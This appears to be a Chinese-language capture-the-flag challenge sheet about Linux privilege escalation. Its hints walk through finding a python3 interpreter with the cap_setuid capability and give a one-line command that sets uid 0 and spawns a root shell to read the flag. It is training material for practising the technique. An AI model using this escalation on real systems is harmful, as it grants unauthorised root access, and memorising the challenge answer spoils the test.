# 第 6 题：被藏起来的 SUID —— Capabilities

## 场景

这台应用服务器上，安装脚本为了“方便”给某个解释器加了特殊权限，
现在那个“便利”还在。

## 目标

拿到 root 权限，读取 `/flag.txt`：

```bash
cat /flag.txt
```

## 登录

```bash
ssh -p 22006 player@<主机IP>
# 密码：Player@2026
```

## 提示

1. 如果你只会 `find / -perm -4000`，你会**什么都找不到**。还有别的“特殊权限”吗？
2. Linux 的 capability（能力）机制——它可以把“root 的一部分能力”赋给**单个文件**：
   ```bash
   getcap -r / 2>/dev/null
   ```
3. 找到带 `cap_setuid` 的程序。`cap_setuid` 意味着什么？
   （提示：`cap_setuid` = 允许切换任意用户，包括 uid 0）
4. 它是个解释器——你可以直接让它执行 Python 代码：
   ```bash
   python3 -c "import os; os.setuid(0); os.system('/bin/sh')"
   ```
5. 进去后：
   ```bash
   id
   cat /flag.txt
   ```

## 评分

成功 `cat /flag.txt` 得到 `Ly_Flag{...}` 即为通过。
